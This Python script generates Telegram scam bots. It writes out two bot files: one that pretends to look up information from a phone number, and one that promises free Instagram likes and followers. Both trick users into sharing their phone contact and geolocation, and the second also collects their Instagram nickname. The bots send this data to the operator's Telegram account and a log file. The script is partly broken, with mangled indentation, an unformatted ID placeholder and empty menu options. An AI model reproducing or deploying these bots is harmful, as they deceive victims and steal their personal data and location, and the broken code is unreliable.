import colorama
from colorama import Fore
import os

def main_menu():
    print(Fore.CYAN + '''
    [1] Punched the number
    [2] Instagram cheat
    [3] Brawl stars
    [4] Acquaintance
    [5] BTC BANKER
    ''')

# Clear the terminal screen
os.system('clear')

# Print a decorative message
print(Fore.RED + '''
     _,.-------.,_
    ''')

# Ask the user to enter a number
user_input = input(Fore.GREEN + "Enter a number: ")

# Check if the entered number contains "12" as a substring
if "12" in user_input:
    print('Correct! You entered a number containing "12"')
    os.system('clear')
    print(Fore.YELLOW + '-----------------------------------------')
    
    # Ask for user input
    userid = input(Fore.RED + "Enter your Telegram ID > ")
    token = input(Fore.BLUE + "Enter your bot token > ")

    # Display the main menu
    main_menu()

    # Get user's choice
    choice = input(Fore.MAGENTA + "Select the fake interface option: >>> ")

    if not choice.isdigit():
        print("Error, option must be numeric")
    else:
        choice = int(choice)

        # Perform actions based on user's choice
        if choice == 1:
            f = open('probiv.py', 'w+', encoding='utf-8')
	f.write('''
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
adr = ['Tverskaya street, house 13', '60th Anniversary of October Avenue', 'Vinokurova Street', '3rd Golutvinsky Lane']
bot.send_message(ID, '!BOT STARTED!') 
print("The bot is running!")

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''👋 Hello! 👋
This is a bot that can show information by phone number!
To search for information, enter the command /getinfo''') 
	
@bot.message_handler(commands=['onlinehacking'])
def start(message):
	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 

@bot.message_handler(commands=['getinfo'])
def start(message):
	msg = bot.send_message(message.chat.id, 'Enter any phone number') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		user_input = message.text
		num = user_input.replace('+', '')

		if not num.isdigit():
			msg = bot.reply_to(message, 'It seems you did not enter a valid phone number, please try again by typing /getinfo!')#⏳
			return

		bot.send_message(m_id, f'Request for number {{num}} has been sent!')
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you have no free requests left for the day!
			To get additional questions, register in the bot!''', reply_markup=keyboard)
# Отловка ошибок
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Data
			├Name: {{first}} {{last}}
			├ID: {{userid}}
			├Nick: @{{nick}}
			└Phone number: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Отправьте свой контакт!')

	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	button = types.InlineKeyboardButton(text="Advanced Search", callback_data="find")
	keyboardmain.add(button)
	bot.send_message(message.chat.id, f'''
		Room information
		├Operator: Beeline
		└Country: Russia
		''', reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "find":
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Confirm", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(call.message.chat.id, text='To use the free advanced search, confirm your geolocation!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {{message.chat.id}}
		├Longitude: {{lon}}
		├Latitude: {{lat}}
		└Cards: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, f'''
			Geolocation
			└Address: {{random.choice(adr)}}
			''')
bot.polling()
		''')
	f.close()
	print("The probiv.py file is saved")
            print("Punched the number mode code has been written to 'probiv.py'")
        elif choice == 2:
            f = open('nacr.py', 'w+', encoding='utf-8')
	f.write('''
import telebot
from telebot import types
import time
import random


log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!')
print("Bot launched!") 
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''👋 Hello! 👋
This is a bot for getting likes and subscribers on Instagram!
To start, write /getfollowers''') 
@bot.message_handler(commands=['OnlineHacking'])
def start(message):
	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
@bot.message_handler(commands=['getfollowers'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Likes", callback_data="first")
	second_button = types.InlineKeyboardButton(text="Followers", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Select a promotion item:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Enter the number of likes (max. 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Enter the number of Followers (no more than 500)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /getfollowers!')#⏳
			return
		if int(num) > 500:
			bot.reply_to(message, 'The number of likes cannot be more than 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you have no free requests left for the day!
To receive additional requests, register in the bot!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /getfollowers!')#⏳
			return

		if int(num) > 500:
			bot.reply_to(message, 'The number of followers cannot be more than 500!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you have no free requests left for the day!
To receive additional requests, register in the bot!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Data
			├Name: {{first}} {{last}}
			├ID: {{userid}}
			├Nick: @{{nick}}
			└Phone number: {{phone}}
   
      🎭 Follow @OnlineHacking for more...
      '''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Submit your contact!')
		bot.send_message(message.chat.id, 'Registration Completed Successfully!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, 'Enter your Instagram Nickname:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'Nick: {{inp}} ')#⏳
		bot.send_message(ID, f'Nick on Instagram: {{inp}}')
		bot.send_message(message.chat.id, 'Expect a boost to your account within 24 hours!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')




bot.polling()


		''')
	f.close()
	print("File nacr.py saved")
            print("Instagram cheat mode placeholder.")
        elif choice == 3:
            # Add code for Brawl Stars mode here...
            print("Brawl Stars mode placeholder.")
        elif choice == 4:
            # Add code for Acquaintance mode here...
            pass
        elif choice == 5:
            # Add code for BTC BANKER mode here...
            pass
        else:
            print("Invalid choice!")

else:
    print('Sorry, the entered number does not contain "12"')
